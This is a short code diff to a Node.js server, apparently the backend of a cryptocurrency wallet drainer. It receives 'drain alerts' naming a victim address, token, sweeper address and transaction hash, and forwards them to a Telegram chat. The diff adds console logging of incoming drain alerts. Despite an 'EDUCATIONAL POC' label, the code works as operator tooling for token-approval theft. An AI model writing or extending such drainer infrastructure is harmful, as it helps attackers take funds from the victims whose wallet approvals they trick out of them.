@@ -12,7 +12,11 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 app.post('/api/alert', (req, res) => {
     const { victimAddress, tokenAddress, sweeperAddress, txHash } = req.body;
-    
+    // Add this inside the app.post('/api/alert') function, right after defining `message`:
+console.log("\n🚨 INCOMING DRAIN ALERT 🚨");
+console.log(`Victim: ${victimAddress}`);
+
+console.log(`Tx Hash: ${txHash}\n`);
     const message = `🚨 *EDUCATIONAL POC: APPROVAL DETECTED* 🚨\n\n` +
                     `👤 Victim: \`${victimAddress}\`\n` +
                     `🪙 Token: \`${tokenAddress}\`\n` +
